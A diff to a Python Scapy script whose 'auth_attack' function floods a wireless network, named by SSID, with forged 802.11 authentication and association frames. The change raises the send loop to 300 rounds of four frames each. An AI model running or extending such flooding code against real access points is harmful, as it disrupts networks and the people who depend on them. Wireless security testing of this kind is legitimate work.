@@ -1,4 +1,5 @@
 from scapy.all import *
+import time
 import optparse
 import os
 
@@ -34,10 +35,15 @@ def auth_attack():
         /Dot11Elt(ID='SSID', info=ssid)
     
     print(WARN_STR+" Attack")
-    for i in range(0,30):
-        sendp(auth_frame, iface=iface)
-        sendp(assoc_frame, iface=iface)
+    for i in range(0,4):
+        sendp(auth_frame, iface=iface,count=4)
+        sendp(assoc_frame, iface=iface,count=4)
         printProgressBar()
+    for i in range(0,300):
+        sendp(auth_frame, iface=iface,count=4)
+        sendp(assoc_frame, iface=iface,count=4)
+        printProgressBar()
+
 
 def printProgressBar():
     print("\x1b[36m->\x1b[0m",end="",flush=True)
